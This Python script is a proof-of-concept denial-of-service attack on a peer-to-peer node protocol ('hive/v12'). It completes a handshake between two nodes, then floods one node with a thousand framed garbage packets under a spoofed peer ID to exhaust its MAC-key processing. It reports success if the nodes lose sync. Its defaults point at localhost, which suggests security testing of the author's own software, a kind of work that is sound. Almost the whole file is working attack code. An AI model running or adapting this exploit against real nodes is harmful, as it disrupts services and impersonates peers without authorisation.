#!/usr/bin/env python3
print("DEBUG: SCRIPT START")
import sys
import os
import time
import json
import urllib.request
import urllib.error
import random
import argparse

print("DEBUG: IMPORTS DONE")

def _post(url: str, payload: dict, timeout: int = 5) -> dict:
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return json.loads(r.read().decode("utf-8"))
    except urllib.error.HTTPError as e:
        try:
             return json.loads(e.read().decode("utf-8"))
        except:
             return {"error": str(e)}
    except Exception as e:
        return {"error": str(e)}

def _send_garbage(target_url: str, session_id: str, peer_id: str, count: int):
    print(f"[*] Sending {count} garbage packets to {target_url} (Session: {session_id[:8]}... Peer: {peer_id})...")
    for i in range(count):
        # Construct FRAMED garbage to pass unframe_payload and force _mac_key call
        # unframe expects: [len, b, b, ..., tag, tag...]
        # len = 10
        msg_len = 10
        enc_content = [random.randint(0, 255) for _ in range(msg_len)]
        tag = [random.randint(0, 255) for _ in range(32)]
        
        # Valid frame: [len] + content + tag
        payload = [msg_len] + enc_content + tag
        
        msg = {
            "type": "DATA",
            "session_id": session_id,
            "nonce": random.randint(0, 99999999), 
            "ephemeral_salt": random.randint(0, 999999),
            "payload": payload,
            "field_profile_id": "attack_profile",
            "created_at_ms": int(time.time() * 1000)
        }
        try:
            req = urllib.request.Request(
                f"{target_url}/hive/v12/receive",
                data=json.dumps({"prev_hop_id": peer_id, "msg": msg}).encode("utf-8"),
                headers={"Content-Type": "application/json"},
                method="POST"
            )
            with urllib.request.urlopen(req, timeout=0.1) as r:
                 # Success 200 means it was processed (and probably rejected application-level, but accessed)
                 pass
        except urllib.error.HTTPError as e:
            # If 500/400, print once
            if i == 0:
                 print(f"    [!] First packet HTTP Error: {e.code} {e.read().decode('utf-8')[:100]}")
        except Exception as e:
            if i == 0:
                 print(f"    [!] First packet Error: {e}")
        
        if i % 100 == 0:
            sys.stdout.write(".")
            sys.stdout.flush()
    print("\n    [Done]")

def check_sync_and_get_session(url_a: str, url_b: str, node_b_id: str) -> tuple[bool, str]:
    print(f"[*] Checking Sync A->B...")
    content = f"SyncCheck_{int(time.time())}"
    resp = _post(f"{url_a}/hive/v12/send", {"dst_node_id": node_b_id, "content": content})
    msg = resp.get("msg")
    if not msg:
        print("    [!] A failed to send.")
        return False, ""
    session_id = msg.get("session_id", "")
    resp_b = _post(f"{url_b}/hive/v12/receive", {"prev_hop_id": "A", "msg": msg})
    status = resp_b.get("status")
    print(f"    Result: {status} (Reason: {resp_b.get('reason')})")
    # Accept 'ok' or 'delivered' as success
    is_success = status in ["delivered", "ok"]
    return is_success, session_id

def perform_handshake(url_a: str, id_a: str, url_b: str, id_b: str) -> str:
    print(f"[*] Performing Handshake {id_a} <-> {id_b}...")
    import hashlib
    session_id = "ATTACK_SESS_" + hashlib.sha256(os.urandom(32)).hexdigest()[:16]
    ephemeral_salt = random.randint(0, 999999)
    
    print(f"    [A->B] Challenge...")
    resp_c = _post(f"{url_b}/hive/v12/challenge", {"peer_id": id_a})
    chal = resp_c.get("challenge")
    if not chal:
        print("    [!] A->B Challenge failed")
        return ""
        
    resp_sign = _post(f"{url_a}/hive/v12/verify_req/create", {
        "session_id": session_id, "ephemeral_salt": ephemeral_salt, "challenge": chal
    })
    msg_a = resp_sign.get("msg")
    if not msg_a:
        print("    [!] A Create VerifyReq failed")
        return ""
        
    resp_v1 = _post(f"{url_b}/hive/v12/verify_req/process", {
        "peer_id": id_a, "msg": msg_a, "ttl_s": 60
    })
    if not resp_v1.get("verified"):
        print(f"    [!] B rejected A: {resp_v1}")
        return ""
        
    print(f"    [B->A] Challenge...")
    resp_c2 = _post(f"{url_a}/hive/v12/challenge", {"peer_id": id_b})
    chal2 = resp_c2.get("challenge")
    if not chal2:
        print("    [!] B->A Challenge failed")
        return ""
        
    resp_sign2 = _post(f"{url_b}/hive/v12/verify_req/create", {
        "session_id": session_id, "ephemeral_salt": ephemeral_salt, "challenge": chal2
    })
    msg_b = resp_sign2.get("msg")
    if not msg_b:
        print("    [!] B Create VerifyReq failed")
        return ""
    
    resp_v2 = _post(f"{url_a}/hive/v12/verify_req/process", {
        "peer_id": id_b, "msg": msg_b, "ttl_s": 60
    })
    if not resp_v2.get("verified"):
        print(f"    [!] A rejected B: {resp_v2}")
        return ""
        
    print(f"    [OK] Handshake Complete. Session: {session_id}")
    return session_id

def main():
    print("DEBUG: MAIN START")
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument("--url-a", default="http://127.0.0.1:8890")
        parser.add_argument("--url-b", default="http://127.0.0.1:8891")
        parser.add_argument("--id-a", default="A")
        parser.add_argument("--id-b", default="B")
        parser.add_argument("--packets", type=int, default=1000)
        args = parser.parse_args()
        print(f"DEBUG: ARGS PARSED: {args}")

        # 1. Handshake
        session_id = perform_handshake(args.url_a, args.id_a, args.url_b, args.id_b)
        if not session_id:
            print("[!] Handshake failed.")
            sys.exit(1)

        is_synced, _ = check_sync_and_get_session(args.url_a, args.url_b, args.id_b)
        if not is_synced:
            print("[!] ERROR: Nodes are NOT synced initially (even after handshake).")
            sys.exit(1)
            
        print(f"\n[!!!] LAUNCHING LATTICE EXHAUSTION ATTACK AGAINST NODE A [!!!]")
        print(f"      Targeting Session: {session_id} (Spoofing {args.id_b})")
        _send_garbage(args.url_a, session_id, args.id_b, args.packets)
        
        print(f"\n[*] Checking Sync Post-Attack...")
        is_synced_post, _ = check_sync_and_get_session(args.url_a, args.url_b, args.id_b)
        
        if not is_synced_post:
            print("\n[SUCCESS] VULNERABILITY CONFIRMED: Nodes desynchronized!")
        else:
            print("\n[FAIL] Nodes are still synced. DOS failed.")
    except Exception as e:
        print(f"DEBUG: EXCEPTION IN MAIN: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    print("DEBUG: CALLING MAIN")
    main()
